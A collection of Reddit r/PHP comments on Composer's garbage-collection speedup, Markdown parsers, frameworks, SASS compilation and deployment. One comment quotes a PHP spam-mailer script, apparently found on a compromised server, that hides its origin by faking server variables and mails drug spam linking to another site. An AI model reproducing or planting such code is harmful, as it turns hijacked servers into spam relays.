Yes that's the point. You process the request, enable gc, clean up and disable it for the next request. while(true) { $this-&gt;processRequest(); gc_enable(); gc_collect_cycles(); gc_disable(); } Maybe it'll be easier to understand if I rearrange it like this: while(true) { gc_disable(); $this-&gt;processRequest(); gc_enable(); gc_collect_cycles(); }
I definitely only submitted it once.
By service, I meant Django or having to install Ruby with Apace etc.
&gt; Symfony2 has a very active, some call it "fanatic", community base. Don't confuse professionals using a professional tool with fanaticism.
Typescript is actually very good if you build large JavaScript applications. The compiler catches a lot of errors that you would otherwise miss making testing easier and quicker.
Yep. OP, look at PHPUnit, Selenium, Behat. 
&gt; i dont get your point Maybe he wants something self hosted, not a service.
Thanks! I hope you find some useful information there.
Is there a way to decouple templates and models? As I've only used mustache (and the mustache.php implementation) I'll use that for examples. Let's say I have the template: &lt;div class="{{type}}"&gt; {{username}} &lt;/div&gt; That's a straightforward template to use. But what if the model stores 'username' as 'name'? What if I later decide to change names in the template (e.g. 'username' -&gt; 'user')?. Preferably, the solution should be able to scale to at least 20 different template variables with different semantics (e.g. some are plain values, others are lists, etc.)
I have a bunch of questions which you could also use as prompts for a conference talk. Please answer some/none/all of these here as well! Why PHP? What, specifically, did PHP have that all the other choices didn't? &gt; I had to learn how the PHP garbage collector works internally to some extent, since the process is never supposed to die (as the process is the server). How so? What things about the PHP garbage collector did you need to workaround/with? &gt; Keep track of circular assignments Examples? Why does this prevent proper garbage collection? &gt; Make the entire application stateless What does this look like? How do you have to change how you use PHP normally to accommodate this? &gt; and the two communicate using sockets How does socket IO work in PHP? How do you use it? (This seems like an entire topic in and of itself) &gt; make extensive use of individual libraries Did your unique architecture affect this decision? Did you have to rewrite any to avoid memory leaks or what not? &gt; but it's designed to operate across multiple servers Is there anything else about this architecture that's interesting? For example, once you had all of this infrastructure in place, how does it change how you write applications? How do you hookup all the different aspects of an application?
Stackoverflow is less suitable for a popularity count, it however correlates with framework *support woes*. Notably the amount of Symfony questions is related to its unwieldy API, whereas Laraval attracts a lot of manual-eschewing newbs and predominantly API breakage inquiries. The Yii2 tag hardly looks representative.
Cool. Didn't say you said I did, but was just making it clear if it happened it wasn't my fault. Not entirely sure what your assertion was all about that this is the same as the original announcement about CommonMark. It's not at all.
I got 2/4 of them right. Fixed though.
[SOLID](http://nikic.github.io/2011/12/27/Dont-be-STUPID-GRASP-SOLID.html)
&gt; Let us compare the popularity of 3 mayor PHP Frameworks: Yii2 vs Symfony2 vs Laravel. A framework's popularity does not reflect (*only*) from google searches. In this context a google search is mostly done when you don't understand something and if you have a good source of learning, a google search is made very rarely. Put in the same context that Symfony and Zend are mostly used by professionals (*often in a corporate environment*) who could get their training at their job place, from the company behind the framework that they are using, courses or other place. Any framework that is targeted (*by accident or not*) to hobbyist, startups or small shops will get more google searches than Zend and Symfony, because you (*as a developer*) will get your training as you go, from different sources ; and mostly those source will be online and discovered through a google search. 
You do realize that laravel and others are based on symfony components?
yes - thats why i asked for his motivation for that, the answer he provided didnt seem like he ACTUALLY needs a self hosted service
I think it's a bit unfair to use version numbers for Symfony and Yii, but not for Laravel. But the [chart without versions](http://www.google.com/trends/explore#q=laravel%2C%20symfony%2C%20yii%2C%20phalcon%2C%20fuelphp&amp;cmpt=q) look pretty similar (added Phalcon and phpFuel). Zend Framework is a bit trickier to compare with since I think the search terms people use are less consistent.
If you're setting up the repo to act as a sort of facade or adapter pattern for a highly complex subsystem, then yeah, totally. And I completely agree that abstracting out the various parts of the process to independent portions of the code base is a good idea for reuse. But, in this case I don't think he's relying on a specific route or controller is a "bad thing" here. More than likely this is his validation portion after submission or processing. If this is the "ok, work's done, time to submit/validate the new/updated document" then there's no problem. /shrugs. TL;DR - I agree with you in principle, I just don't think this is a case where that's applicable.
Tldr: use a CommonMark implementation. It makes me sad reddit is listed as part of "the others", despite having way more people writing Markdown than the rest of the sites. :(
Well kinda to that tl:dr, but knowing why, knowing the history, knowing how to improve the situation if you can't switch, seeing what things are like in other communities not just PHP, and knowing whats coming up with extensions - and why - is all part of this process and part of the story being told. If it could be said short hand I wouldn't have spent a day writing it, fact checking it and talking to people about it. Not sure what you mean about in the 2nd paragraph. 
A quick one for the PHPers who wonder why the League is adopting `colinodell/commonmark-php` and not just suggesting people use `cebe/markdown` or `erusev/parsedown`. Both those other implementations are aware of CommonMark, but playing it cautious with their implementation of it. They have legacy and don't want to just break their stuff, and want to wait for CommonMark to be finished. &gt; The current version of the CommonMark spec is complete (two years in the making!), but provisional pending public feedback, testing, and evaluation. They're not on v1.0, but I would be shocked if huge clangers came through at this late stage, other than how extensions / directives might work. They will not break things, but add some rules. So, those two implementations are focused on speed first, and not so much on compliance, which might come later maybe. [erusev/parsedown is on 40%](https://github.com/erusev/parsedown/issues/213) [cebe/markdown hasn't started](https://github.com/cebe/markdown/issues/62) We know that `colinodell/commonmark-php` is slower, but it is compliant. Different tools, different goals. It wasn't that long ago that people were [ripping parsedown apart on Reddit](http://www.reddit.com/r/PHP/comments/237scy/parsedown_better_markdown_parser_in_php/) for its code quality, and folks are acting all shocked that somebody is not using it. Typical. :)
Possible solutions: a) [wgRawHTML](http://www.mediawiki.org/wiki/Manual:$wgRawHtml) + [Mediawiki:Sidebar](http://www.mediawiki.org/wiki/MediaWiki:Sidebar) b) Direct addition to [modified skin](http://www.mediawiki.org/wiki/Manual:Skinning) c) DOM manipulation (which you're right to avoid for a number of reasons, but it *is* the "just git er done" solution)
So I've read this book cover to cover, and its a great read. Especially for people with little/no experience deploying an application using some of the more modern tools available. As a developer, having a little dev ops knowledge can be extremely useful.
Part of it is what /u/mattaugamer said, but part of it also because the job market for PHP doesn't lend itself to higher salaries. You don't see a lot of enterprise applications built in PHP, and enterprise applications are where the six figure salaries are. You don't see many six figure salaries for Wordpress brochureware work. As such, many seasoned and skilled developers lean towards languages with higher earning potential, and thus other languages become their language of choice.
Honestly I would just get a subscription to laracasts.com, and read up on a lot of the different forums about Laravel. I say this because all of those books are for Laravel 4.x, and Laravel 5.x is going to be coming out "soon tm" and honestly the best resource for "best practice" probably will not be in those books. I say this because I am not sure if most of those books go into detail into the middle-ware functionality, domain events, DDD, repositories, gateways, presenters. The issue with Laravel imho is the issue with most PHP applications that I have seen. That the "framework grows with you" but it doesnt tell you when you are doing things poorly. Of the few Laravel books I have read most of them do not touch on how to write your controllers in a "testable" way with Repositories and the such. Also the Documentation for Laravel 4.x doesn't actually go into this that much unless you look around.
Thank you, I really appreciate that.
OK my bad, I thought this package was new.
You might want to check out /r/forhire as well. Lots of devs looking for work there.
Symfony's performance issues come from a couple different places, and they can all be handled if you know about them without much headache. I've found it's usually 2 things. * In development mode, the container will be recompiled on each request. This is done so that if you make changes to the configuration you don't need to run `php app/console cache:clear` every time you want to test changes to the configuration. This step is skipped in production, so (during development) this may make symfony appear significantly slower than it actually is. * Doctrine, like any ORM, comes with overhead. By learning how to use doctrine, you can get around the majority of any performance issues it creates. Most of this actually just comes down to just knowing a little bit about how it works. (don't flush in a loop and take advantage of eager/lazy loading when necessary).
Phabricator is pretty full-featured. To be honest I gave it up because I got too used to JIRA to quit, even if it cost me money, but it seemed nice while I had it.
Sure, making informed decisions is always better than making uninformed ones, but for people who are lazy, it's nice to have a one-sentence "this is what you should do", like with "use bcrypt!" for password storage. &gt; Not sure what you mean about in the 2nd paragraph. Oh, nothing serious, just complaining for the sake of complaining. :) I was referencing this section: &gt; If StackOverflow, GitHub and the others hashing out CommonMark all had their own flavors before, then they are reducing the number of flavors out there purely by letting these folks get on with it. Given that reddit is [highly-trafficked](http://www.alexa.com/siteinfo/reddit.com) and [highly-participant](https://www.reddit.com/about/), we are probably the largest source of people writing Markdown.
Give golang a try. The syntax is easy to pickup if your familiar with PHP.
Do you have any suggestions to give the Techempower guys? Symfony2 has been consistently doing very badly there: http://www.techempower.com/benchmarks/#section=data-r9
I recommend using AuraSQL. It is an extension to PDO and allows "in" clauses among other things
Thanks, I'll cross-post it there!
Awesome, thanks. The $wgRawHTML hack is great – I hadn't found that one!. I set it up, but it isn't working, oddly. The html elements appear in Mediawiki:Sidebar fine, but they appear to be interpreted and reformatted when the sidebar is actually constructed, by which point they're gone. Definitely trying skinning it next. I'm pretty sure that will work.
https://twitter.com/dnsimple/status/539506070390329345 unfortunately.
This is either a poorly disguised shill piece, or you haven't the slightest about why a framework or language becomes widely adopted and thus stays relevant. Out of a miriad possible examples, I'll pick one I'm most familiar with: show me a few is e-commerce solutions that could be considered for adoption in a mid to high traffic enterprise grade scenario.
Like meth said, for sure get a Laracasts subscription, ESPECIALLLY if you are just starting out with Laravel cause you will avoid so many headaches. You can browse videos by easy, medium, hard ,etc. As far as the books, I can only tell you which book NOT to get, and that's Laravel Design Patterns and Best Practices. That book is fucking trash. I literally read it like 3 hours and thought "this is the worst Laravel book I have ever read" The only one I havent read in that list is the blueprints one. McCool's book a legit for sure, so is the Cookbook but you probably don't need that yet. I would get McCools. 
This is kind of correct. I don't *need* one, but I would much prefer one PHP and self hosted. I will be writing some SSO bridge between the PM software and other services that are running so that users don't have to remember different passwords, or change them in multiple places. As said, this is a nice to have, but thought I would come here and see if there was any good solutions.
Yeah, Redmine runs on Ruby which can use Apache, but that means Ruby has to be installed and maintained for just Redmine. Not too much of a biggy, but want to try to keep it PHP and installs down to a minimum.
Atlassian suite looks very cool. Might have to get it.
I dont even know what the word "shill" means so you got me there buddy! But I can assure you I'm not trolling or doing anything other than trying to get responses from other PHP devs. It's funny you said eCommerce cause that is the one area I have a ton of experience in and I agree will probably take some time to replicate in any JS framework. But you said a myriad of possible examples, I don't know of many more. Let me clarify my question a little more so people don't think Im trolling or don't know what I'm talking about. I don't think server side stacks will ever become obsolete, that's not what Im saying. There will always be use cases. But for the MAJORITY of modern web and mobile apps, something like meteor (true full stack with DB access client side, reactive ui, true push/pull sync) is shit you just cannot reproduce with PHP and some random front end framework without putting in a TON of extra work. My goal of this discussion is to see if anybody else has thought about this and has a real opinion on where the technology is going. I hated Node when it first came out, I hated NoSQL when it first gained attention, I still hate a few of the JS frameworks but its hard to argue against something like Meteor. I have no affiliation with them at all and I havent event build a fucking meteor app yet. 
If you're going to self-host JIRA, have a lot of RAM ready. A base installation needs about 2GB to run smoothly.
Not sure about your area, but most .NET devs in my area make 50% more than PHP devs in my area. I'm already underpaid, and learning this made me far more sad.
I'm inclinded to agree with /u/kovosz - you've made a pretty sweeping statement about an extremely new framework that (a) can't possibly take over in even the majority of situations for other than fairly simple web apps and (b) is based on Node.js, which has scaling and threading issues making it unsuitable for really large scale apps. That being said, I think it would be great to be able to write in one language from back end to front. Do I think that Meteor is the framework that will accomplish that? No. Do I think one is likely to arise in the next 10 years even that will snag major mind and market share? Again, no. Too much entrenched investment in current stacks and frameworks, and too little robustness for things like Meteor.
Really appreciate the insight.
I'm getting a failed DNS lookup.
Thanks for your reply, I agree that my first post comes across like a "sweeping" statement but its wasn't meant too. For sure the tech is young and if you look at in terms of what's the best platform today, when you think about robustness, security, scalability, etc. I would certainly stay with a proven stack. My thought is just that to me the whole basis of these stacks is starting to seem outdated. Meteor isn't just a new framework its a new protocol in DDP. I think that's mainly what intrigues me and makes the standard request cycle seem outdated. But anyways that's all I wanted, some insight from other devs like me
If your basic need is multilingual function, you should check [Smoolis](http://smoolis.com) . Its really cool! You can try it free for one month.
SSO is supported by most project management softwares like asana, no need to code anything if you use standards.
When DNSimple is back up I'll eventually get it up.
Since you're seeking opinions, I'll throw mine into the ring - take it with as much salt as you need. I think you are analysing the web dev space with an excessively adversarial mindset, and that you'll worry about it less if you can work on that. I'm new to Reddit but have been on Stack Overflow for years, where "use what fits and use what you are productive with" seems to be the most popular mantra. Sure, we get people who will argue that Laravel is better than Symfony, or that MEAN is better than Rails, but they're generally in the minority. Thus, if someone doesn't like PHP, that's fine, no problem. They're not a "hater", which in itself is rather an exaggeration - are such folk really motivated by hate, exactly? No, they are not. Should we _really_ reply to these opinions with (ahem), a "fuck you"? No, it would be childish and counterproductive to do so. I mean you no offence at all -- genuinely -- but I do think any perpetuation of framework/language/architecture wars could use some constructive discouragement. A old colleague of mine endorsed this view, I think, when he said to me that he regarded himself as a "developer", and not a "PHP developer". He wasn't distancing himself from the language he most used: it's just he regarded PHP as a tool, just like Python and Node and Go (and he uses all of them). Personally, I really like PHP. I think it's exciting at the moment, in terms of the energy of the community and the frequency of core releases. Facebook's input with HHVM has been a great influence too. I think all of this will be around for many years to come. Some people will move to Meteor, which is fine, and some people won't, and that's fine too. As to what you should invest your time in: it depends. If you are a professional developer, and you believe there are Meteor employment opportunities, and you like using it, then consider investing more time learning it. As ever, it's a question of what to focus on, but even within the space of "all LAMP apps", there are more technologies than any one person could master. 
There will always be flavor of the day developers. And to an extent they are wizard chasers. What is that? Some programmers hate to program and they are constantly chasing after a tool that can do the work for them. These tools never life up to their promises but for a while they are paradise and the dreamers flock towards them and declare them the savior of all. And then move on. Rails? Python? Already post-hype. In the years I have seen quite a few projects try to adopt these new tools and then flounder because their advocates don't yet know the inner details and the juniors don't yet exist leading to projects running out of time and budget because the seniors take to long because they have to learn everything from the beginning again (simple stuff like optimization pages taking ages to load the same developer could have gotten to run faster with older better understood tech) and the juniors first have to be trained for six months before they can do even the most basic stuff. And this is alright for giants like Google or for government projects but in web developer 6 months of training is a bit long for a 3 month project. Because there is an ugly truth, the fast majority of web development is NOT writing the next Google Big Thing. It is small projects, with tight budgets and even tighter deadlines. And the biggest constraint is the third, finding even remotely qualified people to do the work. I often see the question: which tool should I use. Answer: whichever one you can actually find people for. Don't like MySQL? Good job finding an admin who truly understands Postgress. Fancy Oracle? Fancy paying to dollar for an admin? PHP is THE Amateur web development tool. Together with the rest of the LAMP stack it is the largest pool to get talent from. Sure a lot of them aren't very good and might never become good but at least there is a pool. I seen a lot of companies falter as they picked a flavor of the day toolset, then the project runs out as the team has to do everything from scratch, the originator quits to chase the new flavor of the day and the company is left trying to find people to fill the job vacancy requirement from hell. Take NodeJS. There are already precious few people who can do proper javascript for the frontend and such people can attract a premium salary. Do you want your 4 customers a day webshop to depend on those people? Nah, you need to script kiddy who can install a plugin in Magento and customize it a tiny bit. Know who you are as a developer and as a product owner. I my experience, Django, NodeJS etc are for those who aspire to do great things. PHP is for those who do things. The simple test is software packages. You may hate Magento, Wordpress, Drupal, PHPBBS etc etc. But they exist. Where are their counterparts written with other languages? It is not that these tools are bad but most of the people chasing them are chasing them for the wrong reason. They hope to find a magical tool to take the boring part out of programming. They are going about it the wrong way. You want to know how to take the boredom out of programming? Get juniors to do it. Seniors set up the frame and juniors fill it in, fill it in better then any wizard/configurator ever can, they get experience, you get a fun job. Any language/toolset can be used like this. But you need seniors that know the ins and outs and juniors who are picking it up. Develop in a new toolset and seniors are juniors and juniors don't even get a chance. Warning: If you EVER interview for a company where they only hire seniors. RUN!
There's legitimate reasons to ask this question, but meteor.js isn't it. You are inheriting a whole host of problems if that's your only solution to the LAMP stack. The amount of technical constraints you are putting on your project by choosing meteor from the start is pretty severe. Maybe meteor's data store/collections fit your data structures just right, but good luck if they don't - and even if they do, good luck reliably scaling. It's great for prototypes or maybe projects that aren't intending to grow. 
Holy cow.
I agree with the suggestion that this is not an ideal sub for the question. Moreover, it is quite broad, and you might find it better (in the long run at least) to find a good PHP resource, to learn about how to read from a database and render data in HTML. There at a lot of things to learn, and rather more than can fit into a brief answer here! Let me know if you want me to recommend some resources. 
I dont have a solution. But this is why I prefer Less and php-less for this. With SASS/Compass I think people don't realize its "create on Dev server -- compile and push to Prod" workflow, and only that. Somebody please prove me wrong. EDIT: unless you want Ruby or some other language on your server along with PHP ... meh.
This probably has to do with many "PHP devs" actually being untrained people hacking on Wordpress or Drupal.
as a workaround add to your /etc/hosts (i grabbed the ip from opendns' cache check) `69.164.207.127 leftnode.org` 
What you suggest is commonly done for items that are completely depended on the host. Game mods for instance. Because it makes it very clear for which version of the game the mod is meant. But it only really works if your code is tied to a version of the parent. If your code works just as well in older or newer versions it makes no sense. If your code moves much more quickly, it makes no sense. If your code moves much less quickly, it makes no sense. So if your code is extremely closely tied to the version of the parent project, yes. Every other circumstance, no. Oh and in your example, your don't have the same version number. So there is no direct connection, so don't.
I have a grunt task that runs on my server. I develop locally, push to github, my github repo automatically deploys to my production server and then grunt detects the change and compiles the sass to css. 
doesn't less require node? my team has ruby/sass installed on the server and the css is compiled as a deployment hook. compiled css shouldn't exist in source control and you shouldn't be manually pushing files to the server (imo)
[Bldr](http://bldr.io) used to use that, but i think it was having version issues? Switched to richthegeek/phpsass after that.
How does one get confused by that &gt;.&gt;
More than likely, yes. That being said, 99% of the work I do is plugin and theme development, so I can't really talk.
Rather than using a PHP library that implements SCSS/SASS, I think it's better to use a PHP binding for [libsass](https://github.com/sass/libsass). Libsass is written in C and is very very fast compared to the ruby version. It's doesn't support sass 3.4 yet, but it should be more then enough for your requirements. It's also compiled as a binary, so you don't have to install anything, just dump the binary on your server. Here's a [list of bindings](https://github.com/sass/libsass/wiki/Implementations) for libsass and the most active PHP binding is [sensational/sassphp](https://github.com/sensational/sassphp).
I think this is a tool limitation, not an inherent limitation. Hopefully I can find a tool that does this.
That looks very promising. I'm in complete control of the environment so a binary with binding is no issue. Thanks for the tip!
Or use this direct link: https://69.164.207.127/posts/expert-php-deployments.html and tell your browser to ignore the mismatched ssl certificate.
Had a quick skim (it looks great!) and bookmarked for reading later. How about putting it up on Github and hosting it on Github pages so that the community and provide updates and improvements? :)
Seconded. That would be great. 
Thanks! DNSimple is really hurting now.
Sure. Ever wrote a big application? It's really hard to get along without static code analysis. And without having the ability to annotate the code, you have no change to get a clue what's going on without testing every aspect of your code-paths. That's simply not needed to a certain extend if you see problems at design-time. And then, let's talk about refactoring (automatically renaming every occurence of a property, a class or a method in the whole application) or navigating through the code. I am totally with you, annotations are not an ideal way to describe the static being of an application. But it's the only working right now.
This would be the best way forward IMHO. And feature parity between libsass and "classic" Ruby based 3.4 Sass is getting very close.
Yes, I know exactly what static code analysis is and the benefits of it. You asked why you were getting downvoted, and I commented that it's because annotations aren't docblocks. What you're actually referring to in your initial comment is a docblock, not annotation. Annotations have a very specific meaning in many languages including PHP. Annotations provide metadata about a section of code through comments and are interpreted at runtime or compiled in to provide additional functionality for that code. So, the way your comment reads is actually incorrect - the correct term for what you're describing is a docblock or phpdoc.
I didn't really feel the need to prove that I known what I'm talking about, but I tried to make it a point that currently I write in PHP and I love what I do, have a great job and don't regret the choices I've made in my career. It sounds like the way I worded my question was a little too harsh,of course the traditional server side paradigm is still "worth" it and that probably wont change anytime soon. My main point is that something like meteor amd the way it handles the server/client data, reactivity, etc just "feels" like the future and if I was just starting out I would almost certainly focus my energy on that type of stack. With that being said I wanted to see how it devs likr me feel about it. I for sure expected people to say the things that have already been said but I was hoping for more of the "I'm in the same boat" having been programming traditional web apps for a Long time and starting to feel like theres better alternative on the rise.
Yah, I think you're definitely a victim of your own bad phrasing then :) I personally love love loved the idea of things like Comet and Node.js, but they've never managed to mature and gain traction; not just because of entrenched paradigms keeping them out of mindspace, but because while they are better in *some* situations they just can't cover as many use cases as clunky old HTTP/S and so anyone wanting to do enterprise-y stuff with maximal scope wouldn't want to invest in it because, sooner or later, they would need something that HTTP/S does better and would then be stuck either migrating or maintaining two parallel code bases. Ugh. In my experience, growth of this kind tends to be slow change... look at AJAX, as a great example. It's a fabulous way to make apps more interactive and save bandwidth, and has been around since the late 90s, but it only really took off in the last decade and as an adjunct to current infrastructure - not a replacement. For something game changing to be successful, it has to be so obviously better that everyone just starts using it (unlikely for most techs these days), or it has to follow the MS pattern for taking over market/mind share: extend, embrace, extinguish (or, for less mercenary models, phase out rather than extinguish).
No problem, if it was the case it could be a valid concern. 
Ah yeah thanks it looks really good! Yep would need to make it standalone, but definitely doable!
Github's DNS rarely gets DDoS'ed....
As far as I can tell, the OP is binding that input, so they don't need to sanitise. 
(deleted my original comment, I was totally wrong.)
A couple things. On your line 13, I don't think you want the curly braces. $search_word = '%'.$search_result.'%'; On 17, you're echoing the query as you've prepared it, rather than the returned data from your fetch: $query_results = $results-&gt;fetch(PDO::FETCH_ASSOC); echo json_encode($query_results); With those in mind, you may want to rename a few of your other variables since they would be confusing as-is. EDIT: I should probably note that fetch() will get you one result, and fetchAll will return all of them, so you probably want that instead. Also, use the right PDO::FETCH_* enum to suit your needs. I'd personally opt for objects over arrays.
If you've never done it, build your own. Once you've built your own, make the decision project by project, but frameworks have a lot of value and reinventing the wheel is boring as hell. I can't wrap my head around the number of devs out there constantly rewriting boring old MVx frameworks just because they're convinced they can do it better than everyone else.
Thanks for all of the interest everyone! Here's a link to the PDF - https://leftnode.org/assets/expert-php-deployments.pdf
I've been using [The Bug Genie](http://www.thebuggenie.com/) at work, but Phabricator looks better. I'm installing it tonight.
Use environment variables. For example, you use apache vhost setenv to set the variable values or configuration file path and then in php you use [getenv()](http://ca.php.net/getenv) to access that data on the environment, so you never change the PHP, just the vhost config on setup. The nice thing about setting the configuration variables is they're then never in the source code repository, whilst the configuration path usage will mean all of the different configs are in the source code repo.
gr8 b8 m8 PBKDF2 needs a high iteration cost parameter to be effective.
No, it does not. Also, &gt; compiled css shouldn't exist in source control I'm not sure i'd agree with this either. You should never be compiling code in production because if it fails, you are in for a world of hurt. Compiling CSS is part of the development process.
Not to my knowledge, however, you can do "less-compilation-as-a-service". You need to build a node.js app that compiles LESS files with a REST interface. In PHP, you simply call that REST interface, pass in the appropriate input and get the compiled file back. If building out a service in your app is not your cup of tea or overkill, you can just have PHP execute the command line compiler to compile.
I don't always post my own, often people do it for me. Reddit usually flags up repeat URLs so god knows why this happened twice.
Yay. Thanks for the reference. The fork you linked is mine. I'm updating it here and then to latest libsass, but the library still is kind of in flux, producing erroneous css output at times. In production, I'm therefore still shelling out to the ruby based sass compiler (via another project of mine, [pilif/sacy](https://github.com/pilif/sacy) which is a smarty plugin to transform, compile and minify all sorts of assets)
There is a port to php at http://leafo.net/lessphp/. I don't know how well it keeps up with upstream. If you can, I would recommend shelling out to the upstream binary
one more here http://ciconia.kzykhys.com/
I personally prefer [Elasticsearch](http://www.elasticsearch.org/) over Sphinx.
Yep, but why you need it to be "effective"? Aren't you already using 256 bits from /dev/uradom? And one would argue, in general, if 8000 PBKDF2 iterations is really that effective :D
The way it's done in Symfony, there are 3 config files: 1. Common 2. Dev 3. Prod So everything that has to be in both you just put in common. If a config file has sensitive data and you don't want to put it into repository, create `config.dist.yml`, that will have all the necessary properties with dummy values and put it into repository. This way you can faster change them in production.
Does anyone bother reading the sidebar? The reason your post is on 0 karma is because this belongs in /r/phphelp
Simplified version: http://pastebin.com/JGzgHEh1
 Here is some example replacement code for you to play with (untested): // heres what you are searching for $search_array=('vodka', 'tequila'); // build some ?'s to go in the query string. One per array element $placeholder_str = str_repeat('?, ', count($search_array)-1) . '?'; // the query string - a bit more complicated - put it into phpmyadmin and // play with it to see how it works. $query = &lt;&lt;&lt;END_QUERY SELECT DISTINCT r.title, r.text FROM recipe AS r JOIN recipe_word_relation AS rw ON (r.recipe_id = rw.recipe_id) JOIN words AS w ON (w.word_id = rw.word_id) WHERE w.word IN ($placeholder_str) ORDER BY r.title END_QUERY; // note the END_QUERY above has to start at col0 and have no trailing spaces // add a try/catch to trap PDO errors try { // note the $query contains a number of ? for bound variables // echo $query; // if you want to see it $results = $handler-&gt;prepare($query); // the execute replaces the ? with our array values $results-&gt;execute($search_array); // from /u/BrianFranklin comment below $query_result = $results-&gt;fetchAll(); echo json_encode($query_result); } catch (PDOException $e) { echo "ErrorCode:" . $e-&gt;getCode() . " ErrorMessage:" . $e-&gt;getMessage(); die; } Good luck - hopefully this helps a little 
Is this the 90s again? * Lightning / cloud overlay scrolling banner * I can't right click * The cursor gets changed * Javascript testimonial animations * Footer marquee * The following message if you try view 'http://www.webloungeinc.com/js/' - "You are not allowed to check this page. Your IP address will be tracked if you come again here and you will be get an email from Cyber Crime." Really? I dun goofed, sorry :|
Wow, thats a really bad website. Lightning? Really? In the footer you list all the things your company can do, but I'm sure, that you can't do anything of that really good. "Jack of all trades, master of none"
I've had more than a few enterprise level php gigs. Basically everything I've worked on for the last 10 years. All of them had 6 figure potential for the right candidate. You simply have to up your game. Be a software engineer, and not a php dev. It's just a set of tools. if you can use them well, there really is no limit to your earning potential. This is all just FUD. 
Have you got an example of the output??
https://twitter.com/seldaek/status/539729674445012993
[**@seldaek**](https://twitter.com/seldaek): &gt;[2014-12-02 10:28:45 UTC](https://twitter.com/seldaek/status/539727864523128832) &gt;Between some optimizations from [@naderman](https://twitter.com/naderman) and a tip by [@schmittjoh](https://twitter.com/schmittjoh) about gc\_disable, Composer now runs in ~half the time it did yesterday! ---- [^[Mistake?]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Error%20Report&amp;message=http://reddit.com/2o1b0p%0A%0APlease leave above link unaltered.) [^[Suggestion]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Suggestion) [^[FAQ]](http://np.reddit.com/r/TweetPoster/comments/13relk/) [^[Code]](https://github.com/buttscicles/TweetPoster) [^[Issues]](https://github.com/buttscicles/TweetPoster/issues) 
Even though I couldn't care less about karma on reddit I do care about where I post my things. So thanks for telling my, and sorry about posting in the wrong place
It's worth reading the main PR https://github.com/composer/composer/pull/3482
Thank you very much. This is working for me! And you're right about the names of the variables. It's just when I get irritated about something not working, then I just do stuff that isn't 'good practice'.
This is so awesome. Running `composer update` on a big project with lots of dependancies went from 4m32s down to 31s 
We are provide a wide range of platforms and applications for our extensive range of services include web application development, web design services and SEO services, website and e-commerce development and CMS development
can you elaborate why? i am happy with sphinx and never tested ElasticSearch so far.
Awesome. Huge (92%) improvement on my main project. Before: Memory usage: 125.99MB (peak: 410.03MB), time: 212.32s After: Memory usage: 104.08MB (peak: 251.29MB), time: 16.95s
Wow, I thought composer was running super smoothly this morning. It's amazing - and a testament to the brilliant php community - that tools like composer are available to make our lives so much better. Top work!
Yeah, I'm more of an Ember kid myself and tbh I find the actual making of an API pretty much the easy part (in Laravel) but Firebase looks pretty useful for prototyping.
MMW: People are soon gonna start disabling the GC as an "optimization" to every script they think is slow. Edit: nvm, the pull request already has plenty of references to people doing that in their own projects...
 &lt;?php echo 'l0978q'; error_reporting(0); ini_set("mail.add_x_header", "0"); $_SERVER["SCRIPT_URL"] = "http://" . $_SERVER["HTTP_HOST"] . "/index.php"; $_SERVER["SCRIPT_URI"] = "http://" . $_SERVER["HTTP_HOST"] . "/index.php"; $_SERVER["REMOTE_ADDR"] = "192.168.0.1"; $_SERVER["HTTP_REFERER"] = ""; $_SERVER["SCRIPT_FILENAME"] = ""; $_SERVER["PHP_SELF"] = "/index.php"; $_SERVER["REQUEST_URI"] = "/index.php"; $_SERVER["SCRIPT_NAME"] = "/index.php"; echo mail("coxster88@gmail.com /* &lt;![CDATA[ */ (function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})(); /* ]]&gt; */ ", "Get your drugs iin nooo time thaaannnks ttto quick shipping", "BBuy thhe best qqualiity geeeneric andd nmee brnnds onlne with worldwwwidee shippping. http://thenmozhi.org/oldfiles/backup/uw8ck.php", "From: wpsbhy@" . $_SERVER['SERVER_NAME'] . " " . "Reply-To: wpsbhy@" . $_SERVER['SERVER_NAME']); echo 'l0978q'; 
It is basically another approach to programming. Apparently it goes very well alongside OOP. I found [THIS](http://dsheiko.com/weblog/aspect-oriented-software-development-and-php) article very useful :) It explains what it is, and implementation etc etc. From what I can tell it is meant to fix some of the issues with the *MVC* pattern - but that is yet to be fully proved ... I stumbled across it earlier today while looking at alternatives to MVC myself. I was looking for something with a more **Modular** approach where and alot more separation. 
Good. Generally accepted PHP is too crappy to ever be handled by the GC anyway (i.e. over 20k objects per request).
I'm really curious to see what effect this has on config cache generation for Magento.
Already been pointed out on the commit, but wouldn't moving the package-&gt;id and provider-&gt;id check improve speed even more by potentially cutting out a lot of expensive method calls in *$this-&gt; obsoleteImpossibleForAlias()*
Internet police. Comin to getcha
when adding &lt; 100 characters to your program gets you 90% speed improvement, you've probably done something wrong. This is a new proverb of mine.
cmark is compliant and faster than all of them, wouldn't it be better to turn that into a PHP extension? Or make it built-in to PHP?
I'd like someone who has used them all to compare aurasql, fluentpdo, and notorm. And any others in that class that I don't know about.
What's the GC?
I think [this](http://ramonkleiss.nl/intro-to-aop/) article might be useful for you.
Imma just put [this](http://ramonkleiss.nl/intro-to-aop/) article right here for those interested..
Garbage collection 
100 characters is quite a lot though, you can fit quite a few in for a patch, especially with {} an
Oohh, someone who has used it! Gimmie a sec while I pick your brain for juicy info! Basically what I am *trying* to do at the moment is build an API system, which will simply output JSON. **That's All** yet I am not sure if I should use a framework, or build a little something myself - or go completely off the edge and use something like *AOP*. I am not 100% sure if AOP would be best suited for a restful api .... but then again what is ?? MVC? 
As a side note, if you're looking for building a REST API in PHP, you may want to check out https://groups.google.com/forum/#!forum/resting-with-symfony
Awesome thank you! However I have read bad things about Symfony .... I have heard much better things about something like Slim as an API framework
I read it as 'EaglePorn' the first time 0_o does it make me a weirdo ?)
This is a horrible piece of software. Please stop advertising it, some poor newbie might start a project with it not knowing better. Guys like you make php have a bad reputation among developers. Be responsible and take this down asap and never talk about it again.
8000 is a sane default. (TrueCrypt only used 1000 IIRC.) I'll probably end up tuning it to use a larger value later :)
